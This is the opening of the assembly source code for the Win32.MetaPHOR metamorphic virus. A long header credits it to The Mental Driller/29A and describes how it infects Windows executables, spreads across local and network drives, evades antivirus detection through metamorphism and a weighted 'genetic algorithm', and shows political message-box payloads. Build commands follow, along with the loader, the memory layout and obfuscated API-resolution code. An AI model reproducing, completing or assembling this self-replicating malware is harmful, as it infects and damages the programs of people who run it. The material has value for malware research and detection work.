
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;; ----------------------                                                    ;;
;; * Win32.MetaPHOR v1B *                                                    ;;
;; ----------------------                                                    ;;
;;                                                                           ;;
;; Metamorphic Permutating High-Obfuscating Reassembler                      ;;
;;                                                                           ;;
;;                                           Coded by The Mental Driller/29A ;;
;;                                                                           ;;
;;                                                                           ;;
;; I proudly present my very first metamorphic virus (in its version 1.1).   ;;
;;                                                                           ;;
;; This virus is only code. No tables, no indirect jumps, etc. etc. It       ;;
;; doesn't uses the stack to construct strings, executable code or data:     ;;
;; what I do is a reservation of 3'5 Mb of data (more or less) with          ;;
;; VirtualAlloc and then use the decryptor to copy the decrypted virus there ;;
;; (or unencrypted, since it has a probability of 1/16 of being unencrypted, ;;
;; so the decryptor in that cases is in fact a copy routine). The reserved   ;;
;; memory is organized in sections (as if it were a PE) where I do all the   ;;
;; operations. VirtualAlloc will be retrieved by the decryptor if it's not   ;;
;; imported by the host, and the host must import GetModuleHandleA/W and     ;;
;; GetProcAddress to be infected. This functions will be used by the virus   ;;
;; to get the needed APIs.                                                   ;;
;;                                                                           ;;
;; The type of metamorphism followed is what I call the "accordion model":   ;;
;; disassembly/depermutation -> shrinking -> permutation -> expansion ->     ;;
;; -> reassembly, so the code can be bigger or smaller than the previous     ;;
;; generation.                                                               ;;
;;                                                                           ;;
;; The metamorphism in this virus is complete: even the result of the        ;;
;; shrinking can't be used for detection, because is different in every      ;;
;; generation. That's the point where I introduce a new concept: dimensions  ;;
;; in recoding (I mean, code that only get shrinked on two or more           ;;
;; generations, but not in the immediate following; this would be the        ;;
;; "third" dimension). This makes the disassembly to have always a different ;;
;; shape from generation to generation, but, when stabilized, never growing  ;;
;; uncontrolablely.                                                          ;;
;;                                                                           ;;
;; I have added a genetic algorithm in certain parts of the code to make it  ;;
;; evolve to the best shape (the one that evades more detections, the action ;;
;; more stealthy, etc. etc.). It's a simple algorithm based on weights, so   ;;
;; don't expect artificial intelligence :) (well, maybe in the future :P).   ;;
;;                                                                           ;;
;; I tried to comment the code as cleanly as possible, but well... :)        ;;
;;                                                                           ;;
;; If the code isn't optimized (in fact, it's NOT optimized), it's because:  ;;
;;                                                                           ;;
;; 1) It's more clear to see the code that the internal engine will deal     ;;
;;  with (for example, many times I use SUB ECX,1 instead of DEC ECX,        ;;
;;  although the disassembler can deal with both opcodes).                   ;;
;; 2) What's the point for optimizing the code when in next generation it    ;;
;;  will be completely unoptimized/garbled? :)                               ;;
;; 3) The obfuscation in next generations is bigger (MUCH bigger).           ;;
;;                                                                           ;;
;;                                                                           ;;
;;  General sheet of characteristics:                                        ;;
;;                                                                           ;;
;;    Name of the virus.............: MetaPHOR v1.0                          ;;
;;    Author........................: The Mental Driller / 29A               ;;
;;    Size..........................: On 1st generation: 32828 bytes         ;;
;;                                    On next ones: variable, but not less   ;;
;;                                                  than 64 Kb               ;;
;;    Targets.......................: Win32 PE EXEs, supporting three types  ;;
;;                                    of infection: mid-infection (when      ;;
;;                                    .reloc is present), at last section    ;;
;;                                    but using the padding space between    ;;
;;                                    sections to store the decrytor/mover,  ;;
;;                                    or all at last section.                ;;
;;                                    It infects EXEs with a 50% of prob. in ;;
;;                                    current directory and going up the     ;;
;;                                    directory three by three levels. It    ;;
;;                                    also retrieves the drive strings on    ;;
;;                                    the system and makes the same if they  ;;
;;                                    are fixed or network drives.           ;;
;;                                    It uses EPO patching ExitProcess.      ;;
;;    Stealth action................: It doesn't enter in directories that   ;;
;;                                    begin with 'W' (avoiding the windows   ;;
;;                                    directory) and doesn't infect files    ;;
;;                                    with a 'V' in the name or beginning    ;;
;;                                    with the letters 'PA', 'F-', 'SC',     ;;
;;                                    'DR' or 'NO'.                          ;;
;;                                    Genetic algorithm in the selection of  ;;
;;                                    the infection methods, the creation of ;;
;;                                    of the decryptor and some more things  ;;
;;                                    to make it more resistant or more      ;;
;;                                    difficult to detect due to "evolution".;;
;;    Encrypted.....................: Sometimes not.                         ;;
;;    Polymorphic...................: Yes                                    ;;
;;    Metamorphic...................: Yes                                    ;;
;;    Payloads......................: 1) A message box on 17h March, June,   ;;
;;                                      September and December with a        ;;
;;                                      metamorphic message :).              ;;
;;                                    2) On 14h May and on hebrew systems it ;;
;;                                      displays a messagebox with the text: ;;
;;                                      "Free Palestine!"                    ;;
;;    Anti-debugging................: Implicit                               ;;
;;    Release history...............:                                        ;;
;;           v1.0:  11-02-2002 (I just finished commenting the source code   ;;
;;                              and correcting the bugs I found doing that). ;;
;;           v1.1:  14-02-2002                                               ;;
;;                                                                           ;;
;;                                                                           ;;
;; To do in next versions:                                                   ;;
;;                                                                           ;;
;; 1) ELF infection: I only have to add APIs and call one or another         ;;
;;   depending on the operating system, and add the ELF infection algorithm. ;;
;; 2) Reassembly for different processors: IA64, Alpha, PowerPC, etc. I only ;;
;;   have to code a new disassembler/reassembler, since for every internal   ;;
;;   operation I use a self-defined pseudo-assembler with its own opcodes.   ;;
;; 3) Plug-in injector                                                       ;;
;; 4) More things (of course!! :).                                           ;;
;;                                                                           ;;
;;                                                                           ;;
;; My thanks comes to:                                                       ;;
;;   29A, of course.                                                         ;;
;;   Vecna & Z0MBiE for being pioneers in the field of metamorphism. I thank ;;
;;     Vecna his interest by this virus and his suggestions. Of course, I    ;;
;;     never took them in account :P (acaso te dije como tenias que hacer    ;;
;;     el Lexo32, boludin asqueroso??? :P :P :P :P ;D)                       ;;
;;   Eden Kirin, the author of ConTEXT (editor for programmers). It would be ;;
;;     a hell to make a source like this one with EDIT :).                   ;;
;;   The opressed people in the world.                                       ;;
;;                                                                           ;;
;;                                                                           ;;
;; Also big thanks to Trent Reznor and NIN by their music, which inspired    ;;
;;  me greatly while coding this, specially the Halo 14 (commonly known as   ;;
;;  "The Fragile"). From the lyrics of "Somewhat damaged", a quote that      ;;
;;  resumes quite well the feeling of this code:                             ;;
;;                                                                           ;;
;;  "how could I ever think it's funny how                                   ;;
;;   everything that swore it wouldn't change is different now..."           ;;
;;                                                                           ;;
;; Well, in the song it doesn't have that meaning, but it does when you      ;;
;;  quote it alone heading this code :).                                     ;;
;;                                                                           ;;
;; And a big "FUCK YOU" to fascists, whatever the flag or religion they use  ;;
;; to hide themselves behind, the country they live/represent and the moral  ;;
;; reasons they say to justify their actions (for both attack and revenge):  ;;
;; all them have the same inferior mind that makes them to think like        ;;
;; animals.                                                                  ;;
;;                                                                           ;;
;;                                                                           ;;
;; OK, so here's the proggy. Enjoy it as much as I enjoyed doing it.         ;;
;;                                                                           ;;
;; To assemble:                                                              ;;
;;    TASM32 /m29A /ml MetaPHOR.asm                                          ;;
;;    TLINK32 -Tpe -aa -x MetaPHOR.obj,,,kernel32.lib                        ;;
;;                                                                           ;;
;;    No need of making PEWRSEC!                                             ;;
;;                                                                           ;;
;;                                                                           ;;
;; Quick reference (keyword search):                                         ;;
;;                                                                           ;;
;;    Variable declaration........................: Key_!VarDeclr            ;;
;;    Beginning of virus..........................: Key_!VirusStart          ;;
;;    Disassembler................................: Key_!Disassembler        ;;
;;    Shrinker....................................: Key_!Shrinker            ;;
;;    Variable identificator......................: Key_!VarIdent            ;;
;;    Permutator..................................: Key_!Permutator          ;;
;;    Expander....................................: Key_!Xpander             ;;
;;    Reassembler.................................: Key_!Assembler           ;;
;;    Infection code..............................: Key_!Infector            ;;
;;    Decryptor maker.............................: Key_!MakePoly            ;;
;;                                                                           ;;
;;                                                                           ;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
.386p
.model flat
locals

.code
                ret   ; All code in DATA section. TASM allow this and we
.data                 ; don't need to activate the write flag after assembling
                      ; the code.

AddressToFree   dd      0

extrn ExitProcess:PROC
extrn VirtualAlloc:PROC
extrn VirtualFree:PROC
extrn GetModuleHandleA:PROC
extrn GetProcAddress:PROC
extrn MessageBoxA:PROC        ; First generation imports


;; This code (PreMain) only exists at first generation.
;; PreMain is a loader of the virus in the same way an infected host will
;; load it.
PreMain         proc
                push    4
                push    1000h
                push    340000h     ; Reserve 340000h bytes (~ 3.4Mb)
                push    0
                call    VirtualAlloc
                or      eax, eax
                jz    @@Error
                mov     ebp, eax    ; Set delta of reserved memory

                mov     [AddressToFree], eax
                mov     ebx, eax
                mov     esi, offset Main
                mov     edi, eax
                mov     ecx, offset EndOfCode
                sub     ecx, offset Main
                rep     movsb         ; Copy virus

                push    __DISASM2_SECTION
                push    __DATA_SECTION
                push    __BUFFERS_SECTION
                push    __DISASM_SECTION
                push    __CODE_SECTION     ; Push section addresses
                mov     eax, offset GetProcAddress
                mov     eax, [eax+2]
                push    eax              ; Push needed APIs
                mov     eax, offset GetModuleHandleA
                mov     eax, [eax+2]
                push    eax
                push    5*2 ; Bit 0=0: 'A', 1:'W' for GetModuleHandle
                call    ebx             ; Call MetaPHOR!

                push    0C000h
                push    0
                push    dword ptr [AddressToFree]
                call    VirtualFree    ; This isn't needed at all, since where
                              ; our process is destroyed all the virtual memory
                              ; allocated by it is deallocated automatically.
      @@Error:
                push    0
                call    ExitProcess
PreMain         endp

;; Now we are executing in the reserved memory

;;
;; ATTENTION: LEAs loading offsets of variables are problematic (due to the
;; variable identificator) so, in the cases like string constructors and
;; getting info from FindFirst and FindNext the operations will be performed
;; directly into memory sections, to avoid them getting marked as variables.

;; In the entrance, the polymorphic loader/decryptor must pass the next data:
;;; DeltaReg --> Initialized (in this case, EBP)
;;;
;;; In reverse-push order (C-like):
;;;     * (Number of register used for Delta SHL 1) AND (A/W flag for
;;          GetModuleHandleA/W)
;;;     * Address to GetModuleHandle in import table
;;;     * Address to GetProcAddress in import table
;;;     * Offset of CODE_SECTION
;;;     * Offset of DISASM_SECTION
;;;     * Offset of BUFFERS_SECTION
;;;     * Offset of DATA_SECTION
;;;     * Offset of DISASM2_SECTION
;;;
;;; All data passed is local to the engine, I mean, it can be modified (and
;;; in fact it will be modified) during the reassembly. In this way we don't
;;; have even the variables in a fixed delta location, although even keeping
;;; fixed section offsets the variables are relocated.

;;
;;

;; KEYWORD: Key_!VarDeclr
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;;************************************************************************;;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;
;;
;; Memory addresses. The variables are internal offsets into the data section,
;; so they are coded in this way. As you can see, all them are EQUs.
;;
;; There are also some equates to make easier the programming, although all
;; the values here are only valid on first generation, due to the fact that
;; they'll recalculated and randomized.
;;
__CODE_SECTION          EQU     000000h
__DISASM_SECTION        EQU     100000h
__BUFFERS_SECTION       EQU     080000h
__LABEL_SECTION         EQU     __BUFFERS_SECTION + 00000h
__VARIABLE_SECTION      EQU     __BUFFERS_SECTION + 10000h
__BUFFER1_SECTION       EQU     __BUFFERS_SECTION + 20000h
__BUFFER2_SECTION       EQU     __BUFFERS_SECTION + 30000h
__VAR_MARKS_SECTION     EQU     __BUFFERS_SECTION + 40000h
__DATA_SECTION          EQU     0E0000h
__DISASM2_SECTION       EQU     200000h

NumberOfLabels          EQU     __DATA_SECTION + 0000h
NumberOfInstructions    EQU     __DATA_SECTION + 0008h
InstructionTable        EQU     __DATA_SECTION + 0010h
LabelTable              EQU     __DATA_SECTION + 0018h
FutureLabelTable        EQU     __DATA_SECTION + 0020h
PathMarksTable          EQU     __DATA_SECTION + 0028h
NumberOfLabelsPost      EQU     __DATA_SECTION + 0030h
AddressOfLastInstruction EQU    __DATA_SECTION + 0038h
VariableTable           EQU     __DATA_SECTION + 0040h
NumberOfVariables       EQU     __DATA_SECTION + 0048h
FramesTable             EQU     __DATA_SECTION + 0050h
PermutationResult       EQU     __DATA_SECTION + 0058h
JumpsTable              EQU     __DATA_SECTION + 0060h
AddressOfLastFrame      EQU     __DATA_SECTION + 0068h
PositionOfFirstInstruction EQU  __DATA_SECTION + 0070h
MODValue                EQU     __DATA_SECTION + 0078h
NumberOfJumps           EQU     __DATA_SECTION + 0080h
RndSeed1                EQU     __DATA_SECTION + 0088h
RndSeed2                EQU     __DATA_SECTION + 0090h
ExpansionResult         EQU     __DATA_SECTION + 0098h
Register8Bits           EQU     __DATA_SECTION + 00A0h
Xp_Register0            EQU     __DATA_SECTION + 00A8h
Xp_Register1            EQU     __DATA_SECTION + 00B0h
Xp_Register2            EQU     __DATA_SECTION + 00B8h
Xp_Register3            EQU     __DATA_SECTION + 00C0h
Xp_Register4            EQU     __DATA_SECTION + 00C8h
Xp_Register5            EQU     __DATA_SECTION + 00D0h
Xp_Register6            EQU     __DATA_SECTION + 00D8h
Xp_Register7            EQU     __DATA_SECTION + 00E0h
DeltaRegister           EQU     __DATA_SECTION + 00E8h
Xp_8Bits                EQU     __DATA_SECTION + 00F0h
Xp_Operation            EQU     __DATA_SECTION + 00F8h
Xp_Register             EQU     __DATA_SECTION + 0100h
Xp_Mem_Index1           EQU     __DATA_SECTION + 0108h
Xp_Mem_Index2           EQU     __DATA_SECTION + 0110h
Xp_Mem_Addition         EQU     __DATA_SECTION + 0118h
Xp_Immediate            EQU     __DATA_SECTION + 0120h
Xp_SrcRegister          EQU     __DATA_SECTION + 0128h
Xp_FlagRegOrMem         EQU     __DATA_SECTION + 0130h
Xp_RecurseLevel         EQU     __DATA_SECTION + 0138h
Xp_LEAAdditionFlag      EQU     __DATA_SECTION + 0140h
VarMarksTable           EQU     __DATA_SECTION + 0148h
_BUFFERS_SECTION        EQU     __DATA_SECTION + 0150h
_CODE_SECTION           EQU     __DATA_SECTION + 0158h
_DISASM_SECTION         EQU     __DATA_SECTION + 0160h
_LABEL_SECTION          EQU     __DATA_SECTION + 0168h
_VARIABLE_SECTION       EQU     __DATA_SECTION + 0170h
_BUFFER1_SECTION        EQU     __DATA_SECTION + 0178h
_BUFFER2_SECTION        EQU     __DATA_SECTION + 0180h
_VAR_MARKS_SECTION      EQU     __DATA_SECTION + 0188h
_DATA_SECTION           EQU     __DATA_SECTION + 0190h
_DISASM2_SECTION        EQU     __DATA_SECTION + 0198h
New_CODE_SECTION        EQU     __DATA_SECTION + 01A0h
New_DISASM_SECTION      EQU     __DATA_SECTION + 01A8h
New_BUFFERS_SECTION     EQU     __DATA_SECTION + 01B0h
; New_LABEL_SECTION       EQU     __DATA_SECTION + 01B0h
; New_VARIABLE_SECTION    EQU     __DATA_SECTION + 01B8h
; New_BUFFER1_SECTION     EQU     __DATA_SECTION + 01C0h
; New_BUFFER2_SECTION     EQU     __DATA_SECTION + 01C8h
; New_VAR_MARKS_SECTION   EQU     __DATA_SECTION + 01D0h
New_DATA_SECTION        EQU     __DATA_SECTION + 01D8h
New_DISASM2_SECTION     EQU     __DATA_SECTION + 01E0h
RVA_GetModuleHandle     EQU     __DATA_SECTION + 01E8h
RVA_GetProcAddress      EQU     __DATA_SECTION + 01F0h
FlagAorW                EQU     __DATA_SECTION + 01F8h
ReturnValue             EQU     __DATA_SECTION + 0200h
hKernel                 EQU     __DATA_SECTION + 0208h
hUser32                 EQU     __DATA_SECTION + 0210h
RVA_CreateFileA         EQU     __DATA_SECTION + 0218h
RVA_CreateFileMappingA  EQU     __DATA_SECTION + 0220h
RVA_MapViewOfFile       EQU     __DATA_SECTION + 0228h
RVA_UnmapViewOfFile     EQU     __DATA_SECTION + 0230h
RVA_GetFileSize         EQU     __DATA_SECTION + 0238h
RVA_GetFileAttributesA  EQU     __DATA_SECTION + 0240h
RVA_SetFileAttributesA  EQU     __DATA_SECTION + 0248h
RVA_SetFilePointer      EQU     __DATA_SECTION + 0250h
RVA_SetFileTime         EQU     __DATA_SECTION + 0258h
RVA_SetEndOfFile        EQU     __DATA_SECTION + 0260h
RVA_FindFirstFileA      EQU     __DATA_SECTION + 0268h
RVA_FindNextFileA       EQU     __DATA_SECTION + 0270h
RVA_FindClose           EQU     __DATA_SECTION + 0278h
RVA_CloseHandle         EQU     __DATA_SECTION + 0280h
RVA_MessageBoxA         EQU     __DATA_SECTION + 0288h
NewLabelTable           EQU     __DATA_SECTION + 0290h
Asm_ByteToSort          EQU     __DATA_SECTION + 0298h
JumpRelocationTable     EQU     __DATA_SECTION + 02A0h
NumberOfJumpRelocations EQU     __DATA_SECTION + 02A8h
Permut_LastInstruction  EQU     __DATA_SECTION + 02B0h
TranslatedDeltaRegister EQU     __DATA_SECTION + 02B8h
hFile                   EQU     __DATA_SECTION + 02C0h
FileSize                EQU     __DATA_SECTION + 02C8h
OriginalFileSize        EQU     __DATA_SECTION + 02D0h
hMapping                EQU     __DATA_SECTION + 02D8h
MappingAddress          EQU     __DATA_SECTION + 02E0h
HeaderAddress           EQU     __DATA_SECTION + 02E8h
StartOfSectionHeaders   EQU     __DATA_SECTION + 02F0h
RelocHeader             EQU     __DATA_SECTION + 02F8h
TextHeader              EQU     __DATA_SECTION + 0300h
DataHeader              EQU     __DATA_SECTION + 0308h
RVA_TextHole            EQU     __DATA_SECTION + 0310h
Phys_TextHole           EQU     __DATA_SECTION + 0318h
TextHoleSize            EQU     __DATA_SECTION + 0320h
RVA_DataHole            EQU     __DATA_SECTION + 0328h
Phys_DataHole           EQU     __DATA_SECTION + 0330h
MakingFirstHole         EQU     __DATA_SECTION + 0338h
ExitProcessAddress      EQU     __DATA_SECTION + 0340h
GetModuleHandleAddress  EQU     __DATA_SECTION + 0348h
GetProcAddressAddress   EQU     __DATA_SECTION + 0350h
VirtualAllocAddress     EQU     __DATA_SECTION + 0358h
GetModuleHandleMode     EQU     __DATA_SECTION + 0360h
VirtualPositionOfVar    EQU     __DATA_SECTION + 0368h
PhysicalPositionOfVar   EQU     __DATA_SECTION + 0370h
Kernel32Imports         EQU     __DATA_SECTION + 0378h
hFindFile               EQU     __DATA_SECTION + 0380h
Addr_FilePath           EQU     __DATA_SECTION + 0388h
FileAttributes          EQU     __DATA_SECTION + 0390h
SizeOfNewCode           EQU     __DATA_SECTION + 0398h
FindFileData            EQU     __DATA_SECTION + 03A0h
OtherBuffers            EQU     __DATA_SECTION + 03A8h
RoundedSizeOfNewCode    EQU     __DATA_SECTION + 03B0h
NewAssembledCode        EQU     __DATA_SECTION + 03B8h
NumberOfUndoActions     EQU     __DATA_SECTION + 03C0h
LastHeader              EQU     __DATA_SECTION + 03C8h
MaxSizeOfDecryptor      EQU     __DATA_SECTION + 03D0h
CreatingADecryptor      EQU     __DATA_SECTION + 03D8h
DecryptorPseudoCode     EQU     __DATA_SECTION + 03E0h
AssembledDecryptor      EQU     __DATA_SECTION + 03E8h
Decryptor_DATA_SECTION  EQU     __DATA_SECTION + 03F0h
SizeOfExpansion         EQU     __DATA_SECTION + 03F8h
SizeOfDecryptor         EQU     __DATA_SECTION + 0400h
TypeOfEncryption        EQU     __DATA_SECTION + 0408h
EncryptionKey           EQU     __DATA_SECTION + 0410h
IndexValue              EQU     __DATA_SECTION + 0418h
IndexRegister           EQU     __DATA_SECTION + 0420h
BufferRegister          EQU     __DATA_SECTION + 0428h
CounterRegister         EQU     __DATA_SECTION + 0430h
BufferValue             EQU     __DATA_SECTION + 0438h
CounterValue            EQU     __DATA_SECTION + 0440h
Poly_FirstPartOfFunction EQU    __DATA_SECTION + 0448h
Poly_SecondPartOfFunction EQU   __DATA_SECTION + 0450h
Poly_ThirdPartOfFunction EQU    __DATA_SECTION + 0458h
AdditionToBuffer        EQU     __DATA_SECTION + 0460h
Poly_Jump_ErrorInVirtualAlloc EQU __DATA_SECTION+0468h
;Index2Register          EQU     __DATA_SECTION + 0470h
Poly_LoopLabel          EQU     __DATA_SECTION + 0478h
RVA_GetSystemTime       EQU     __DATA_SECTION + 0480h
RVA_GetTickCount        EQU     __DATA_SECTION + 0488h
RVA_GetDriveTypeA       EQU     __DATA_SECTION + 0490h
RVA_GetLogicalDriveStringsA EQU __DATA_SECTION + 0498h
RVA_SetCurrentDirectoryA EQU    __DATA_SECTION + 04A0h
StartOfEncryptedData    EQU     __DATA_SECTION + 04A8h
SizeOfNewCodeP2         EQU     __DATA_SECTION + 04B0h
Poly_InitialValue       EQU     __DATA_SECTION + 04B8h
Poly_Addition           EQU     __DATA_SECTION + 04C0h
Poly_ExcessJumpInstruction EQU  __DATA_SECTION + 04C8h
DirectoryDeepness       EQU     __DATA_SECTION + 04D0h
RVA_GetSystemDefaultLCID EQU    __DATA_SECTION + 04D8h
Poly_JumpRandomExecution EQU    __DATA_SECTION + 04E0h
Weight_X000_3           EQU     __DATA_SECTION + 04E8h
Weight_X004_7           EQU     __DATA_SECTION + 04F0h
Weight_X008_11          EQU     __DATA_SECTION + 04F8h
Weight_X012_15          EQU     __DATA_SECTION + 0500h
Weight_X016_19          EQU     __DATA_SECTION + 0508h
Weight_X020_23          EQU     __DATA_SECTION + 0510h

;;
;;
;; End of variables
;;
;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;;


;; KEYWORD: Key_!VirusStart

Main            proc
                ; EBP = Delta offset
                pop     ebx     ; Return address

                pop     eax
                mov     ecx, eax
                and     eax, 1
                mov     [ebp+FlagAorW], eax ; Get if GetModuleHandle is A or W
                and     ecx, 0FFFFFFFEh
                shr     ecx, 1
                mov     [ebp+DeltaRegister], ecx ; Get the delta register nr.

                pop     eax
                mov     eax, [eax]
                mov     [ebp+RVA_GetModuleHandle], eax
                pop     eax
                mov     eax, [eax]
                mov     [ebp+RVA_GetProcAddress], eax
                pop     eax
                and     eax, 03FFFFFh         ; Eliminate the two highest bits
                mov     [ebp+_CODE_SECTION], eax
                pop     eax
                and     eax, 03FFFFFh         ; "
                mov     [ebp+_DISASM_SECTION], eax
                pop     eax
                and     eax, 03FFFFFh         ; "
                mov     [ebp+_BUFFERS_SECTION], eax

                mov     [ebp+_LABEL_SECTION], eax  ; Construct the other
                add     eax, 10000h                ; section addresses
                mov     [ebp+_VARIABLE_SECTION], eax
                add     eax, 10000h
                mov     [ebp+_BUFFER1_SECTION], eax
                add     eax, 10000h
                mov     [ebp+_BUFFER2_SECTION], eax
                add     eax, 10000h
                mov     [ebp+_VAR_MARKS_SECTION], eax

                pop     eax
                and     eax, 03FFFFFh
                mov     [ebp+_DATA_SECTION], eax
                pop     eax
                and     eax, 03FFFFFh
                mov     [ebp+_DISASM2_SECTION], eax
                push    ebx ; Restore return value


;; Let's set the weights for the genetic algorithm. These are code structures
;; recognized by the shrinker.
;; The initial values of the weights are not arbitrary: they are the initial
;; values that simulate the random behaviour that was before the addition of
;; this type of algorithm.
;; These code structures are shrinked as
;;        SET_WEIGHT [ebp+Weight_X000_3],0,EAX,ECX
;;        SET_WEIGHT [ebp+Weight_X004_7],1,EAX,ECX
;; and so on.
                push    eax
                mov     eax, 0
                mov     ecx, 10808080h   ; Weights 3,2,1 and 0
                mov     [ebp+Weight_X000_3], ecx
                pop     eax


                push    eax
                mov     eax, 1
                mov     ecx, 10808010h   ; Weights 7,6,5,4
                mov     [ebp+Weight_X004_7], ecx
                pop     eax

                push    eax
                mov     eax, 2
                mov     ecx, 80808055h   ; Weights 11,10,9,8
                mov     [ebp+Weight_X008_11], ecx
                pop     eax

                push    eax
                mov     eax, 3
                mov     ecx, 80408080h   ; Weights 15,14,13,12
                mov     [ebp+Weight_X012_15], ecx
                pop     eax

                push    eax
                mov     eax, 4
                mov     ecx, 55404040h   ; Weights 19,18,17,16
                mov     [ebp+Weight_X016_19], ecx
                pop     eax

                push    eax
                mov     eax, 5
                mov     ecx, 0F0808080h   ; Weights 23,22,21,20
                mov     [ebp+Weight_X020_23], ecx
                pop     eax

;; Let's get the addresses of the APIs that we are going to use:
                mov     edx, [ebp+_BUFFER1_SECTION]
                add     edx, ebp

                push    eax
                push    ecx
                push    edx  ; APICALL_BEGIN

                mov     eax, 'nrek'
                mov     [edx], eax
                mov     eax, '23le'
                mov     [edx+4], eax
                mov     eax, 'lld.'
                mov     [edx+8], eax
                xor     eax, eax
                mov     [edx+0Ch], eax  ; Get the address of KERNEL32.DLL
                call    APICall_GetModuleHandle
                pop     edx
                pop     ecx
                pop     eax  ; APICALL_END

                mov     eax, [ebp+ReturnValue]
                or      eax, eax        ; Get the handle. If 0, we exit
                jz    @@Error
                mov     [ebp+hKernel], eax

                push    eax
                push    ecx
                push    edx  ; APICALL_BEGIN

                mov     eax, 'resu'
                mov     [edx], eax
                mov     eax, 'd.23'
                mov     [edx+4], eax
                mov     eax, 'll'
                mov     [edx+8], eax  ; Get the address of USER32.DLL
                call    APICall_GetModuleHandle
                pop     edx
                pop     ecx
                pop     eax  ; APICALL_END

                mov     eax, [ebp+ReturnValue] ; It doesn't matter if we
                mov     [ebp+hUser32], eax     ; failed: it's used only to
                                               ; get MessageBoxA for the
                                               ; payload

                mov     edx, [ebp+_BUFFER1_SECTION]
                add     edx, ebp
                mov     edi, [ebp+hKernel]  ; Place to construct the addresses
                                            ; names

                mov     eax, 'aerC'
                mov     [edx], eax
                mov     eax, 'iFet'
                mov     [edx+4], eax
                mov     eax, 'Ael'
                mov     [edx+8], eax
                call    GetFunction   ; Get CreateFileA
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_CreateFileA], eax

                mov     eax, 'ppaM'
                mov     [edx+0Ah], eax
                mov     eax, 'Agni'
                mov     [edx+0Eh], eax
                xor     eax, eax
                mov     [edx+12h], eax
                call    GetFunction   ; Get CreateFileMappingA
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_CreateFileMappingA], eax

                add     edx, 2
                mov     eax, 'VpaM'
                mov     [edx], eax
                mov     eax, 'Owei'
                mov     [edx+4], eax
                mov     eax, 'liFf'
                mov     [edx+8], eax
                mov     eax, 'e'
                mov     [edx+0Ch], eax
                call    GetFunction   ; Get MapViewOfFile
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_MapViewOfFile], eax

                sub     edx, 2
                mov     eax, 'amnU'
                mov     [edx], eax
                call    GetFunction   ; Get UnmapViewOfFile
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_UnmapViewOfFile], eax

                mov     eax, 'SteG'
                mov     [edx], eax
                mov     eax, 'etsy'
                mov     [edx+4], eax
                mov     eax, 'miTm'
                mov     [edx+8], eax
                mov     eax, 'e'
                mov     [edx+0Ch], eax
                call    GetFunction   ; Get GetSystemTime
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_GetSystemTime], eax

                mov     eax, 'virD'
                mov     [edx+3], eax
                mov     eax, 'pyTe'
                mov     [edx+7], eax
                mov     eax, 'Ae'
                mov     [edx+0Bh], eax
                call    GetFunction   ; Get GetDriveTypeA
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_GetDriveTypeA], eax

                mov     eax, 'igoL'
                mov     [edx+3], eax
                mov     eax, 'Dlac'
                mov     [edx+7], eax
                mov     eax, 'evir'
                mov     [edx+0Bh], eax
                mov     eax, 'irtS'
                mov     [edx+0Fh], eax
                mov     eax, 'Asgn'
                mov     [edx+13h], eax
                xor     eax, eax
                mov     [edx+17h], eax
                call    GetFunction   ; Get GetLogicalDriveStringsA
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_GetLogicalDriveStringsA], eax

                mov     eax, 'tsyS'
                mov     [edx+3], eax
                mov     eax, 'eDme'
                mov     [edx+7], eax
                mov     eax, 'luaf'
                mov     [edx+0Bh], eax
                mov     eax, 'ICLt'
                mov     [edx+0Fh], eax
                mov     eax, 'D'
                mov     [edx+13h], eax
                call    GetFunction   ; Get GetSystemDefaultLCID
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_GetSystemDefaultLCID], eax

                mov     eax, 'CteS'
                mov     [edx], eax
                mov     eax, 'erru'
                mov     [edx+4], eax
                mov     eax, 'iDtn'
                mov     [edx+8], eax
                mov     eax, 'tcer'
                mov     [edx+0Ch], eax
                mov     eax, 'Ayro'
                mov     [edx+10h], eax
                xor     eax, eax
                mov     [edx+14h], eax
                call    GetFunction   ; Get SetCurrentDirectoryA
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_SetCurrentDirectoryA], eax

                mov     eax, 'FteG'
                mov     [edx], eax
                mov     eax, 'Seli'
                mov     [edx+4], eax
                mov     eax, 'ezi'
                mov     [edx+8], eax
                call    GetFunction   ; Get GetFileSize
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_GetFileSize], eax

                mov     eax, 'rttA'
                mov     [edx+7], eax
                mov     eax, 'tubi'
                mov     [edx+0Bh], eax
                mov     eax, 'Ase'
                mov     [edx+0Fh], eax
                call    GetFunction   ; Get GetFileAttributesA
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_GetFileAttributesA], eax

                mov     eax, 'FteS'
                mov     [edx], eax
                call    GetFunction   ; Get SetFileAttributesA
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_SetFileAttributesA], eax

                mov     eax, 'nioP'
                mov     [edx+7], eax
                mov     eax, 'ret'
                mov     [edx+0Bh], eax
                call    GetFunction   ; Get SetFilePointer
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_SetFilePointer], eax

                mov     eax, 'emiT'
                mov     [edx+7], eax
                xor     eax, eax
                mov     [edx+0Bh], eax
                call    GetFunction   ; Get SetFileTime
                or      eax, eax
                jz    @@Error
                mov     [ebp+RVA_SetFileTime], eax

                mov     eax, 'OdnE'
                mov     [edx+3], eax
                mov     eax, 'liFf'
                mov     [edx+7], eax
                mov     eax, 'e'
                mov     [edx+0Bh], eax
                call    GetFunction   ; Get SetEndOfFile
                or      eax, eax
                jz    @@Error
